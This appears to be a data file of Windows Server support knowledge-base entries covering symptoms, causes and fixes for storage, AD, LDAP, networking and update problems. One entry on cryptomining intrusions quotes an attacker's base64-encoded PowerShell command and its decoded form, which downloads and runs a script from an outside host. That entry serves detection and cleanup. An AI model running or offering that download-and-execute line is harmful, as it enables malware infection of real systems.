symptom: XPERF or WPT tools fail to start with error "NT Kernel Logger: Cannot create a file when the file already exists (0xb7)" or Active Directory Data Collector fails to start because NT Kernel Logger trace is already in use by another process
rootCause: NT Kernel Logger trace can only be used by one provider at a time. If a service or process (e.g. Sophos Endpoint Defence SSPService.exe) has already started this trace, other tools like XPERF, WPR, or AD Data Collector cannot start it.
solution: Identify the process holding the NT Kernel Logger using a complete memory dump with WinDbg commands: !wmitrace.strdump to find Logger ID, !wmitrace.logger to find real-time consumer, then dt nt!_ETW_REALTIME_CONSUMER to identify the process. Stop that process or collect data sequentially.
sourceRef: ContentIdea#92906

symptom: NMAP ssl-enum-ciphers script does not return TLS settings when run against Windows Server RDP port
rootCause: "Allow connections only from computers running Remote Desktop with Network Level Authentication" setting must be enabled for RDP for nmap command to work.
solution: Enable "Allow connections only from computers running Remote Desktop with Network Level Authentication (recommended)" under System Properties > Remote tab > Remote Desktop settings.
sourceRef: ContentIdea#93119

symptom: Cluster validation fails with error "file Cluster_Validation_TempFile_Disk0, failure: The group or resource is not in the correct state" on Windows Server 2012 with VMware RDM disks
rootCause: MPIO was enabled on cluster nodes even though RDM disks were presented via single path, causing storage validation test to fail during disk failover validation.
solution: Uninstall the MPIO feature from cluster nodes. Reconfigure the RDM LUN from VMware as per VMware MSCS setup recommendation.
sourceRef: ContentIdea#93425

symptom: Intermittent bugcheck 27 (RDR_FILE_SYSTEM) in rdbss!RxInitializeContext due to invalid FCB with null NetRoot
rootCause: Invalid FCB structure with null pNetRoot/NetRoot causes crash when rdbss tries to access the net root structure. Third-party file system filter driver ctifile.sys may be contributing to FCB corruption.
solution: Remove third-party filter driver (ctifile.sys) from the stack. Full RCA requires enabling SMB client kernel tracing + verifier for further investigation.
sourceRef: ContentIdea#93836

symptom: Windows 2008 R2 Server hangs after entering credentials at logon with Symantec Endpoint Protection 14.0/14.1 installed. Takes up to 30 minutes to reach desktop.
rootCause: Race condition in Symantec binaries causing thread deadlock while trying to call a ReferenceObject that was deleted in PreCleanup.
solution: Upgrade to Symantec Endpoint Protection 14.2 MP1 which fixes the issue.
sourceRef: ContentIdea#94326

symptom: Machine hangs indefinitely, logon hang, or Bugcheck 0x9F. Wait chains lead to thread stalled in NETIO!KfdNotifyRscIncompatCalloutAdd function.
rootCause: OS defect in RSC (Receive Segment Coalescing) code path. When RSC enabled, network adapter supports RSC, and a WFP driver not supporting RSC is loaded, code waits forever for rscDisableEvent.
solution: WORKAROUND: Disable RSC (netsh int tcp set global rsc=disable) or disable RSC on each NIC or remove incompatible WFP driver. FIX: Upgrade to RS2+ (client) or Server 2019.
sourceRef: ContentIdea#94666

symptom: Azure VM Windows Server 2016 fails to boot with 0x1E KMODE_EXCEPTION_NOT_HANDLED bugcheck. Faulting instruction is rdmsr/wrmsr, parameter 0xc0000096. Kernel older than July 2018.
rootCause: Spectre/Meltdown mitigation issue in pre-July 2018 kernels. FeatureSettingsOverride registry value set to 8 causes the issue.
solution: Attach OS disk to recovery VM, change FeatureSettingOverride from 8 to 3 in registry, disk swap back, then Windows Update to latest kernel.
sourceRef: ContentIdea#96771

symptom: PowerShell Invoke-Command displays output in different format than direct Get-NetIPConfiguration output on Windows Server 2016
rootCause: By design - deserialization that happens when using Invoke-Command changes output format.
solution: Use Invoke-Command -ScriptBlock { Get-NetIPInterface -CimSession <computername> } instead.
sourceRef: ContentIdea#98145

symptom: Cannot extend/resize Multi-Resilient Storage Spaces Direct (S2D) volume from GUI
rootCause: Multi-Resilient volumes use two tiers (capacity + performance). Both tiers must be expanded separately before resizing, which cannot be done from GUI.
solution: Use PowerShell: Get-StorageTier to check tiers, Resize-StorageTier for each tier, Get-PartitionSupportedSize for max size, then Resize-Partition to expand.
sourceRef: ContentIdea#98492

symptom: You are running an LDAP query against your Active Directory that includes a filter for "memberof". This may be as simple as: ldap_search_s(ld,"DC=contoso,DC=com", 2,"(memberof=CN=Test-DG01,OU=Testuser,DC=contoso,DC=com)",attrList, 0, &msg) The search does not complete, but ends with an error: Error: Search: Operations Error. <1>Server error: 000020E6: SvcErr: DSID-03140776, problem 5012 (DIR_ERROR), data 8996 When you run the same against Windows Server 2012 R2, the search completes: ldap_search_ext_s(ld, "DC=contoso,DC=com", 2, "(memberof=CN=Test-DG01,OU=Testuser,DC=contoso,DC=com)"), attrList, 0, svrCtrls, ClntCtrls, 60, 1000 ,&msg)Getting 2 entries:Dn: CN=Adm,CN=Users,DC=contoso,DC=comobjectClass (4): top; person; organizationalPerson; user; Dn: CN=Admin,CN=Users,DC=contoso,DC=comobjectClass (4): top; person; organizationalPerson; user; You may notice this is happening on Windows Server 2016 and 2019 DCs that are not Global Catalogs. You run the same query on Global Catalogs of the same domain, you get: ldap_search_ext_s(ld, "DC=contoso,DC=com", 2, "(memberof=CN=Test-DG01,OU=Testuser,DC=contoso,DC=com)"), attrList, 0, svrCtrls, ClntCtrls, 60, 1000 ,&msg)Getting 3 entries:Dn: CN=Adm,CN=Users,DC=contoso,DC=comobjectClass (4): top; person; organizationalPerson; user; Dn: CN=Admin,CN=Users,DC=contoso,DC=comobjectClass (4): top; person; organizationalPerson; user; Dn: CN=S-1-5-21-1472547225-2863049882-2601810711-500,CN=ForeignSecurityPrincipals,DC=contoso,DC=comobjectClass (2): top; foreignSecurityPrincipal; Remark: The lack of the FSP match is in fact another problem, but here only happens on Windows Server 2012 R2 which was in Extended Support when this issue was encountered. You run an Active Directory ETL during the query like: logman create trace "ds_ds" -ow -o c:\ds_query.etl -p {90717974-98db-4e28-8100-e84200e22b3f} 0xffffffffffffffff 0xff -nb 16 16 -bs 1024 -mode Circular -f bincirc -max 4096 -ets When decoding the ETL, you find a log section with the "DIR_ERROR" in it: [1] 02C8.01EC [dblayer] dbsearch_c3807 dbMoveToNextSearchCandidate() - dbMoveToNextSearchCandidate failed to set currency due to phantom dntSource:0x1bb8 err 0[1] 02C8.01EC [dblayer] dbsearch_c4639 DBGetNextSearchObject() - Failed to find next candidate error:8996[1] 02C8.01EC [CORE] mderror_c474 DoSetSvcError() - Service error problem:5012 extendedErr:8422(ERROR_DS_CANT_RETRIEVE_CHILD) extendedData:8996 dsid:0X3140776[1] 02C8.01EC [CORE] mdsearch_c2084 LocalSearch() - Completed search request DN:DC=contoso,DC=com Scope:0x2 bOneNC:-1 searchTimeMs:16 cpuTimeMs:0 atqDelayMs:0 SearchEntriesVisited:3 SearchEntriesReturned:3 Signature:3a70a2b2-6ab6-b85d-af7c-6e1b1793a1f8 MemoryUsageInBytes:35968 correlationID:b0fc3f05-7c82-43d2-872b-780af349862f pSearchRes:0000026E2DD94680 PartialOutcomeQualifer:0000000000000000 PartialOutcomeQualifier->problem:_ PagedResult.fPresent:0 pTHS->errCode:0x5 pTHS->errCode.usProblem:5012 pTHS->errCode.win32Err:8422(ERROR_DS_CANT_RETRIEVE_CHILD) pTHS->errCode.ulDSID:0X3140776 pTHS->err.ulData:8996[1] 02C8.01EC [dblayer] dbobj_c9616 dbStoreOrFreeTables() - Storing JetCache tables pTHS:0000026E2A4B0140 pDB:0000026E2DD94740 JetObjTbl:0000026E2A226C20[1] 02C8.01EC [LDAP] request_cxx1424 LDAP_REQUEST::GrowSend() - request:0x0000026E2A29FC30 ScatterGather:TRUE header:20 trailer:17[1] 02C8.01EC [LDAP] userdata_cxx2403 LDAP_CONN::ProcessRequestEx() - Building response request:0x0000026E2A29FC30 choice:4 conn:0x0000026E2A2C5800 m_request:0x0000026E2A2C58D8 correlationID:b0fc3f05-7c82-43d2-872b-780af349862f ErrorMessage:000020E6: SvcErr: DSID-03140776, problem 5012 (DIR_ERROR), data 8996 The key trigger is the first line in bold logged in "dbMoveToNextSearchCandidate". Note you may encounter this for phantoms that you don't expect in the database, for example from domains that are demoted and where Infrastructure Master did not clean them up. One example is here, the key is that the NC head phantom is DEL-mangled: 351767 2042 124 - false 2018-10-26 11:45:42 - - 1376281 contoso\0aDEL:52e6cd92-f5e0-41d3-b8a8-554f2b4df4ce480753 351767 1 - false 2018-10-26 12:49:57 - - 11 Users-OU480754 480753 1 - false 2018-10-26 12:49:57 - - 11 Administrative480755 480754 1 - false 2018-10-26 12:49:57 - - 3 Walter Weinfurter
rootCause: Since Windows Server 2016, the LDAP server makes an additional verification when walking an index to execute a search. For a memberof type filter, the LDAP server may pick the memberof for the indexed search. You can identify the phantoms in a database dump:The group lists like this: 6438 6144 1 2043 true - - 4 3 Test-DG01 51b07e2f-b8bb-4c03-996a-2261e847afcb 6438 1 6126 - - 13298 2043 - 6438 1 6151 - - 13294 2043 - 6438 1 6152 - - 13297 2043 - 6438 1 6612 2019-01-31 11:59:02 - 228430 2043 - 6438 1 7096 - - 745686 2043 - 6438 1 22141 - - 745687 2043 - 6438 1 22142 - - 745688 2043 - 6438 1 22161 2019-01-31 12:03:15 - 228460 2043 Phantoms: 7096 7095 2 - false 1601-01-01 01:00:01 - - 3 Test A. User01 8c6a2c36-8038-47ca-83b9-17a345277f4d22141 7095 1 - false 1601-01-01 01:00:01 - - 3 Test B. User02 e1701746-c727-4649-97f8-a49a81fb0b3a22142 7095 1 - false 1601-01-01 01:00:01 - - 3 Test-UG01 c953de25-e8e1-458b-8467-634f1a05d6f0 The parent is a phantom, too: 7095 5960 3 - false 1601-01-01 01:00:01 - - 11 Test-Accounts 719127d6-e668-42a0-bc04-e7306ac29859 The "dntSource" in the error is 7096 in the database dump.
solution: Track related bugs. Install corrective OS versions and OS updates as they become available OS Bug # Resolving KB Release Date Comments Vibranium 20855539 RTM RTM 19H1 21019058 4522355 2019 10C RS5 21144617 4520062 2019 10B RS1 21011762 4519979 2019 10b Proposed relnote text: The update resolves a problem with LDAP queries with �memberof� expression in the filter. The queries abort with �000020E6: SvcErr: DSID-0314072D, problem 5012 (DIR_ERROR), data 8996�. WorkaroundsThere is no resolution for this right now. You can work around it with: If you can make all Domain Controllers Global Catalog, this problem will go away when the DC has the GC role. The members would then not be phantoms. If the phantom is due to a missing cleanup after a domain demotion, work with support to try removing the group membership. One customer saw the phantom in the member list in ADUC and deleted it from there. If this is not possible, you may need to export the membership, wipe the group membership by deleting the whole attribute, and reimport it. Use Windows Server 2012 R2 as Domain Controllers targeting this search.Example LDIFDE for removing all members:dn: CN=Test-DG01,OU=Testuser,DC=contoso,DC=comchangetype: modifydelete: member Notify the following if you have a customer where you see the same pattern and can find phantom members after installing updates available since October 2019 with the necessary details:To: HerbertM; ArrenCSubject: <SR number> is a match for KB 4494478 / VSO bug 20855539: Search terminates with DIR_ERROR for memberof \ <customer name> \ <case owner alias>

symptom: You found: There are large amount of unknown external TCP connections. And it causes domain account lock out.There are unknown scheduled task runs regularly to trigger unknown powershell command.There is unknown powershell process which consumes much CPU or memory resource. Or there are high CPU used by WMI.Here is a sample of unknown powershell command:powershell -ep bypass -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdgAuAGIAZQBhAGgAaAAuAGMAbwBtAC8AdgAnACsAJABlAG4AdgA6AFUAUwBFAFIARABPAE0AQQBJAE4AKQA=It uses base64 to encrypt its real command. In above sample, the base64-part can be converted to UTF-16: IEX (New-Object Net.WebClient).downloadstring('http://v.beahh.com/v'+$env:USERDOMAIN)In other samples, it could be a long script. See sample in more information.
rootCause: There could be a powershell command planted by hacker. And it's used to download and run malicious powershell script to mine digit asset like Bitcoin or Monero etc.
solution: 1. Use https://www.base64decode.org/ to convert the unknown base64 powershell command to UTF-16. So it could be human-readable.2. Check the converted content in last step, save the script to harddisk and scan it with Windows Defender Antivirus. Provide details to customer and their security team.In addition, this powershell command could be triggered by a hidden task:There may be no task found in task scheduler UI. But there are events in Microsoft-Windows-TaskScheduler/Operational.There is a way to detect it is to search tasks under:Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\{Boot|Logon|Maintenance|Plain|Tasks|Tree} You can delete the malicious task under them to remove the task.
sourceRef: ContentIdea#102984

symptom: When attempting to add a Cloud Witness to a Windows Server 2016 Failover Cluster with TLS 1.2 enabled on the Storage Account side, the following error is encountered: Error Message: Configure Cluster Quorum Settings: An error was encountered while modifying the quorum settings. Your cluster quorum settings have not been changed. The underlying connection was closed: An unexpected error occurred on a receive. The client and server cannot communicate, because they do not possess a common algorithm.
rootCause: In several scenarios, SSL 3.0, TLS 1.0, or TLS 1.1 are being used in Azure Storage Account or SQL Server. SSL 3.0 is no longer supported on Azure Storage Account; a TCP connection reset is observed if configured this way. TLS 1.0 and TLS 1.1 are also considered weak protocols.
solution: Enable TLS 1.2: Open an elevated PowerShell session. Run the following command to enable TLS 1.2: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 Configure Cloud Witness: Obtain the access key from your Azure Storage Account. Replace <accesskey> in the command below with the access key you obtained. Run the following command to configure the Cloud Witness: Set-ClusterQuorum -CloudWitness -AccountName "Name" -AccessKey "<Accesskey of Azure Storage Account>" Ensure Strong Protocol Configuration: It is recommended to use strong and secure protocol configurations between source and destination endpoints to ensure successful TLS negotiation. Note: The enablement of TLS 1.2 via PowerShell is only valid for that specific PowerShell session. If you need to reconfigure the Cloud Witness for any reason, you will need to repeat the above commands.
sourceRef: ContentIdea#104220

symptom: AbstractCustomer is trying to configure NTFS volume mount points up to 100 on Windows Server 2016. further to that they are creating File shares for each of these volumes. SMB Shares works fine however NFS does not work. PS C:\Users\Administrator> New-NfsShare -Name tst -Path "\\?\Volume{0dd7b89e-075d-4ad2-8b55-7409d52eaaeb}\" -AllowRootAccess $True -Authentication Sys -EnableUnmappedAccess $true -Permission readwrite -NetworkName "ramen-fs" New-NfsShare : Failed to perform the requested operation. At line:1 char:1 + New-NfsShare -Name tst -Path "\\?\Volume{0dd7b89e-075d-4ad2-8b55-7409 ... + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : NotSpecified: (MSFT_NfsServerTasks:root/Microsoft/..._NfsServerTasks) [New-NfsShare], CimE xception + FullyQualifiedErrorId : HRESULT 0x8007007b,New-NfsShare The behavior is described in the URL; https://support.microsoft.com/en-us/help/2028639/microsoft-services-for-nfs-does-not-support-ntfs-volume-mount-points For both NFS V3 and V4.1, the root of the export must be on a volume with a drive letter. There can be volume mount points which also point to the volume, but the presence of the drive letter is required and the export must be defined in terms of that drive letter. The export path must not traverse a volume mount point. For NFS V4.1 only, there can be volume mount points below the root of the export and the server will traverse those mount points onto the new volume. There is no NFS server imposed limitation on the number of mount points either on the volume or within a directory hierarchy. If NFS V3 encounters a volume mount point under the export, the server will NOT traverse the mount point and any attempt to get the attributes of the mount point itself might give unexpected results. SymptomsCustomer is building an SMB file server gateway solution for Infinidat block storage using Microsoft Windows Storage server product. In their implementation, they're allowing a customer to run up to 4 virtual Windows failover clusters. Every file server may have up to 100 iSCSI LUNs from the underlying Infinibox storage. Each LUN is formatted with NTFS and is mounted on the file server using NTFS volume mounts.We can�t use drive letters due to the required amount of such file systems / volumes.Customers create SMB shares on top of these file systems which can be accessed by the client systems over SMB.Many of our customers are requesting concurrent access to data using both NFS and SMB protocols. For this purpose, we�re exploring an option to enable NFS server for Windows on the same file servers and allow customers to create not only SMB shares, but also NFS exports on the same file systems.Many (sizable % ) of our customers are asking about dual protocol (concurrent access to the same data via both SMB and NFS), with multiple file systems. Unfortunately, there is a current limitation with NFS server for Windows which doesn�t allow to create an NFS export for a volume using GUID or using NTFS mountpoint: Creating an NFS export using volume GUID:PS C:\Users\Administrator> New-NfsShare -Name tst -Path "\\?\Volume{0dd7b89e-075d-4ad2-8b55-7409d52eaaeb}\" -AllowRootAccess $True -Authentication Sys -EnableUnmappedAccess $true -Permission readwrite -NetworkName "ramen-fs"New-NfsShare : Failed to perform the requested operation.At line:1 char:1+ New-NfsShare -Name tst -Path "\\?\Volume{0dd7b89e-075d-4ad2-8b55-7409 ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : NotSpecified: (MSFT_NfsServerTasks:root/Microsoft/..._NfsServerTasks) [New-NfsShare], CimE xception + FullyQualifiedErrorId : HRESULT 0x8007007b,New-NfsShare Looks like it's a known issue with the older Windows versions: https://support.microsoft.com/en-us/help/2028639/microsoft-services-for-nfs-does-not-support-ntfs-volume-mount-points From the trace, it looks like the NFS server tries to add a prefix of �\DosDevices� to check volume information: [1]1378.11E0::02/22/2019-15:26:58.638 [nfs3svr]NfsOpenDriver called [1]1378.11E0::02/22/2019-15:26:58.638 [nfs3svr]NfsOpenDriver exit [1]1378.11E0::02/22/2019-15:26:58.638 [nfs3svr]ENTERING NfsGetVolumeInfo - \\?\Volume{bba84982-0000-0000-0000-602200000000}\, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000, 0x0000000000000000 [1]1378.11E0::02/22/2019-15:26:58.638 [nfs3svr]ENTRY - opening file by name (0000000000000000 / \DosDevices\\\?\Volume{bba84982-0000-0000-0000-602200000000}\) [1]1378.11E0::02/22/2019-15:26:58.638 [nfs3svr]LEAVING - opening file by name (0000000000000000 / \DosDevices\\\?\Volume{bba84982-0000-0000-0000-602200000000}\) - status 0xc0000033(STATUS_OBJECT_NAME_INVALID) [1]1378.11E0::02/22/2019-15:26:58.638 [nfs3svr]NfsGetVolumeInfo: NfsOpenFileForServer failed with 0xc0000033(STATUS_OBJECT_NAME_INVALID) [1]1378.11E0::02/22/2019-15:26:58.638 [nfs3svr]LEAVING NfsGetVolumeInfo - c0000033 2) Creating an NFS export using mount point:PS C:\Windows\system32> mountvol \mnt\iscsi /l \\?\Volume{35e13a32-fd3d-4098-a8f7-ab30769c44c5}\PS C:\Windows\system32> New-NfsShare -Name tst -Path "c:\mnt\iscsi" -AllowRootAccess $True -Authentication Sys -EnableUnmappedAccess $true -Permission readwriteNew-NfsShare : Failed to perform the requested operation.At line:1 char:1+ New-NfsShare -Name tst -Path "c:\mnt\iscsi" -AllowRootAccess $True -A ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : InvalidOperation: (MSFT_NfsServerTasks:root/Microsoft/..._NfsServerTasks) [New-NfsShare], CimException + FullyQualifiedErrorId : HRESULT 0x80070032,New-NfsShareIMPACT:This limitation doesn�t allow us to use NFS file server in the same way as we�re using SMB file server today. It has an impact on the customer's upcoming SMB node version 2 implementation. We�re currently assessing potential workarounds. We may need to release a limited version which would allow NFS access only to a subset of volumes, using a small amount of drive letters. It will certainly limit our offering for the extended customers of MSFT.

symptom: After installing KB4512506 or KB4512486 update, Windows 7/ Windows 2008 R2 SP1 devices may fail to start with the following error: "File: \Windows\system32\winload.efiStatus: 0xc0000428Info: Windows cannot verify the digital signature for this file." Those KBs map to KB 4512486: August 13, 2019KB4512486 (Security-only update)KB 4512506: August 13, 2019KB4512506 (Monthly Rollup)Related KBs state that this issue is specific to IA64 machines, you can still see this issue in x64 machines as well When you boot the machine into recovery, You will not be able to see the Windows installation driveEnvironment:Windows 7Windows Server 2008 R2 Service Pack 1
rootCause: Known issue as documented in below articles: https://support.microsoft.com/en-us/help/4512486/windows-7-update-kb4512486 https://support.microsoft.com/en-us/help/4512506/windows-7-update-kb4512506
solution: Step 1: To gain access to the Windows installation driveBoot from UEFI bootable WinRE USB device, with disk drivers added (MegaSAS in this case)1, If necessary, unzip or unpack the driver file from your device manufacturer.2, Identify the driver setup (.inf) file, and add it. Dism /Image:C:\mount\winre /Add-Driver /Driver:"C:\SampleDriver\driver.inf" where C:\SampleDriver\driver.inf is the location of the .inf file. (or) Booting from a clean Win 2016/Windows 10 ISO loaded the correct disk drivers can also help Step 2:Check if there are any update in install pending state using below command dism /image:C:\ /Get-Packages Note: Where "C:" is the Windows installation drive Step 3:If you see any update in install pending state, Get it removed by executing the below command: dism /image:c:\ /cleanup-image /revertpendingactions Note: Where "C:" is the Windows installation drive Try booting the machine. If the machine doesnt boot successfully or if you get the same error, Boot into recovery again and proceed with below steps: Step 4: Check if KB4512506 or KB4512486 is already in installed state by running below command dism /image:C:\ /Get-Packages If yes, we need to manually uninstall them. After removing the above KBs successfully Make sure that the below Prerequisite is met Prerequisite: The SHA-2 update (KB4474419) must be installed before installing KB4512486 and KB4512506. For more information on SHA-2 updates, see 2019 SHA-2 Code Signing Support requirement for Windows and WSUS. After installing the KB4474419, restart the machine and confirm the installation is successful. Now push the KB4512486 and KB4512506 updates separately To manually uninstall the package use the below commands md c:\scratch dism /image:C:\ /scratchdir:c:\scratch /Remove-Package /PackageName: <package name that you get from get-packages command> Example This is just an example and the original Package name is different dism /image:C:\ /scratchdir:c:\scratch /Remove-Package /PackageName: Package_for_RollupFix~31bf3856ad364e35~amd64~~16299.726.1.6

symptom: After installing KB4512506 or KB4512486 update, Windows 7/Windows 2008 R2 SP1 devices may fail to start with error: File: Windows/system32/winload.efi Status: 0xc0000428 Info: Windows cannot verify the digital signature for this file. Specific to IA64 machines but can also occur on x64. Boot into recovery cannot see Windows installation drive.
rootCause: Known issue documented in KB4512486 and KB4512506 articles.
solution: Step 1: Boot from UEFI bootable WinRE USB with disk drivers. Step 2: Check pending updates with dism /image:C:\ /Get-Packages. Step 3: If pending, run dism /image:c:\ /cleanup-image /revertpendingactions. Step 4: If still failing, uninstall KB4512506/KB4512486, install SHA-2 prerequisite KB4474419 first, then reinstall.

symptom: LAPS Extension fails to set password for local administrator account. Event ID 5 logged in Application log with error 0x80070a91: 'Validation failed for new local admin password against local password policy.' Manually setting password also fails with 'The password does not meet the password policy requirement'.
rootCause: A 3rd party password filter DPPassFilter.DLL (DigitalPersona) was loaded into lsass.exe, intercepting password changes and rejecting them.
solution: Uninstall the DigitalPersona password filter application (DPPassFilter.DLL). After removal, LAPS was able to update the local administrator password automatically.
sourceRef: ContentIdea#110462

symptom: Unable to copy or access files with cross mark on Windows Server. Files show a cross mark icon and cannot be opened.
rootCause: The files are reparse points created by a 3rd party application (Enterprise Vault from Veritas). The reparse points are placeholders for archived files. When the archival application driver is no longer present, Windows IO Manager cannot process the reparse points.
solution: Identify the reparse tag using 'FSUTIL REPARSE POINT QUERY'. The GUID belongs to Enterprise Vault from Veritas. These are placeholders for archived files. Since the application is no longer installed, the cross-marked files are orphaned reparse points. Refer to Veritas KB article 100019023 for cleanup. Note: Offline Files feature is only available on client OS, not Server SKU.
sourceRef: ContentIdea#113991

symptom: Unable to extend S2D virtual disk after adding new physical disks to storage pool. Error: 'Not enough available capacity.'
rootCause: Newly added physical disks show MediaType as 'Unspecified' instead of 'HDD'. OS cannot identify new uninitialized disks properly, so Storage Spaces Direct cannot use them for capacity expansion.
solution: Manually set MediaType to HDD: Get-StoragePool 'PoolName' | Get-PhysicalDisk | Where MediaType -eq 'Unspecified' | Set-PhysicalDisk -MediaType HDD. Then resize the storage tier: Get-StorageTier -FriendlyName 'TierName' | Resize-StorageTier -Size <newSize>. Finally resize the partition using Get-VirtualDisk | Get-Disk | Get-Partition | Resize-Partition.
sourceRef: ContentIdea#114313

symptom: Robocopy: Some files are not copied to destination server. Some older versions of files are copied to destination due to sync issue with Symantec backup.
solution: Use ROBOCOPY commands to compare and copy missing/updated files. Compare missing files: ROBOCOPY "<source>" "<dest>" /e /l /ns /ndl /fp /log:<logpath>. Copy only updated/missing files: ROBOCOPY "<source>" "<dest>" /e /xo /copyall /FFT /R:3 /W:3 /V /NP /TEE /log:<logpath>.
sourceRef: ContentIdea#114708

symptom: AD LDS service fails to start after raising instance functional level to WIN2016 by manually changing msDS-Behavior-Version to 7. Event ID 1168 logged with error value -1601 (0xfffff9bf). Service startup returns error 0xc0000025.
rootCause: Manually setting msDS-Behavior-Version attribute value to 7 on LDS instances is not supported.
solution: If single server: restore from backup. If multiple replicas and one still running: 1) Seize Schema/Domain Naming FSMO roles to the working server using ntdsutil. 2) Connect to configuration partition and rollback msDS-Behavior-Version to previous value. 3) Perform metadata cleanup of failed server using dsmgmt. 4) Uninstall the LDS instance on failed server. 5) Reinstall as replica from working server.

rootCause: All the Physical disk which were presented in the storage pool had it's Free space was zero.Log Name:      SystemSource:        diskDate:          02.03.2020 17:54:19Event ID:      150Task Category: NoneLevel:         ErrorKeywords:      ClassicUser:          N/AComputer:      Machine Name (Changed)Description:Disk 56 has reached a logical block provisioning permanent resource exhaustion condition

symptom: In an environment where 2 DA servers(DA1 and DA2) are configured in Load Balancing, clients were not able to connect to DA2, once the vNIC drivers were updated while the DA servers were in NLB. Also, the node cannot be added back into DA cluster.Remote access management console was giving an error as below while trying to commit NLB configuration. Issue was only with the external facing interface.Error: Modifying network adapter is not supported when Remote access is deployed in a load balancer cluster.Say, DA1 and DA2 are Direct Access servers configured in NLB.Clients are not able to connect to DA2, however, they can connect to DA1.Network Adapter on DA2 cannot be added using the command: Set-RemoteAccess -ComputerName 'Hostname' -Force -Verbose -InternetInterface 'Adaptername' (We get same error as above)Even when we run Get-RemoteAccess command on DA2, command gets executed but with an error on the first line: One or more of the adapters on the Remote Access server cannot be found. (External Adapter)
rootCause: NA, It is not supported to change any settings from network perspective when the DA servers are load balanced.
solution: At the following registry path, there would be 2 keys containing the Interface GUID for Internal and External interfaces: HKLM\Software\Policies\Microsoft\Windows\RemoteAccess\Config\MachineSIDs\MachineSIDsGUID\Registry keys:InternalInterface GUID1 InternalInterface GUID2 Since the drivers were updated, we needed to run the script below to check the current GUID and match with the once in registry key above:Get-WmiObject -Query "select * from win32_networkadapter" | select GUID,NetConnectionID | where {$_.GUID -notlike $null} | ft -AutoSizeAfter comparing the GUID's, we saw that 'InternetInterface' GUID was not matching the value we got from the script. We changed the GUID from the Registry for 'InternetInterface' with the updated GUID that we got from Script. Rebooted the machine and DA Clients were able to connect without an issue to both the servers.

solution: In GPSVC log we observer below :+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++GPSVC(3d8.1408) 12:03:34:978 ProcessGPOs(User): Processing extension Folder Redirection GPSVC(3d8.1408) 12:03:34:979 ReadGPOList:++ GPSVC(3d8.1408) 12:03:34:979 CheckGPOs: ReadGPOList count = 0 GPSVC(3d8.1408) 12:03:34:979 ReadGPOList:++ GPSVC(3d8.1408) 12:03:34:980 CheckGPOs: ReadGPOList count = 0 for user: <User SID> GPSVC(3d8.1408) 12:03:34:980 CompareGPOLists:  The lists are the same. symptom: Redirected printers remain even after remote users log off from the Server. These appear as ghost printers and may sometimes cause slowness in opening the "Print Management Console" and "Devices and Printers" in the Control Panel.:
rootCause: Registry keys for the redirected printers might not get deleted at user log off. This causes multiple stale entries and sometimes might add up to thousands of keys.
solution: Set up the registry key:   HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Providers\Client Side Rendering Print Provider\RemovePrintersAtLogoff  Value = 0   Restart the machine. This will enable the key and hence every user that logs off after this will have the redirected printers deleted on log off. But, the previous stale entries still remain and hence we will use the process below to remove them.   Download PSExec and run the following script to remove the existing stale entries:   Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList '/k C:\temp\PSTools\Psexec.exe -I -s powershell.exe'   Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Enum\SWD\PRINTENUM\*" -Recurse Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceClasses\*" -Recurse Remove-Item -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Print\Providers\Client Side Rendering Print Provider\*" -Recurse   This should ideally resolve the issue. In case this does not resolve the issue, kindly take a procmon log while opening "Devices and Printers" to see if any other registry keys for printers are being accessed. If yes, and if they contain stale entries, delete those entries too.
sourceRef: ContentIdea#116780

symptom: Consider the following Scenario:Single WS19/WS16 Server with Standalone Storage Spaces (no S2D)Customer used x Number of HDD's and mistakenly some SSD's when he created this Standalone Storage PoolAfterwards Customer created one or more Parity Vdisks from this Pool.Once Customer noted the Error he wanted to remove all SSD's from the Poolwhen Customer is removing the SSD drives from the pool the virtual disk going in detached state Customer retired all SSD's which worked and they still show 10GB Pool Footprint which is equal to the 10GB Write-Back Cache of the Vdisk.
rootCause: When the Parity VDisks was created Spaces automatically created a write cache region for these Parity VDisks on the SSD's. If you have enough SSD capacity and number of SSDs, it should actually create a 1GB write cache size by default.  It will create a mirror write cache child space with number of copies that matches the parent space.  So, for single parity, it will create a 2 copy mirror for the write cache child space.  If only HDD's exist in a Storage Pool and a Parity VDisk is created Spaces will create the write cache region from inside the HDD's. Size of this region is 32MB by default.For parity Vdisks, the write cache is required to front any writes that do not make up a full parity row size.  This is why it is created even for the all HDD pool.So for a parity Vdisk the Write-Cache Region it is required to be non-zero.  For simple or mirror, it can be 0.Get-VirtualDisk | fl *  Usage                             : DataNameFormat                        :OperationalStatus                 : OKHealthStatus                      : HealthyProvisioningType                  : FixedAllocationUnitSize                : 1073741824MediaType                         : UnspecifiedParityLayout                      : Rotated ParityAccess                            : Read/WriteUniqueIdFormat                    : Vendor SpecificDetachedReason                    : NoneWriteCacheSize                    : 33554432There isn't a way to move the write cache disks from SSD to HDD after it has been created.
solution: Add new SSD's as Journal Disks and remove the old SSD's from the Pool Delete the Virtual Disk(s), remove all unwanted SSD's and re-create the Parity Virtual Disk (this will have Spaces create the Write Cache from HDD pool)
sourceRef: ContentIdea#116793

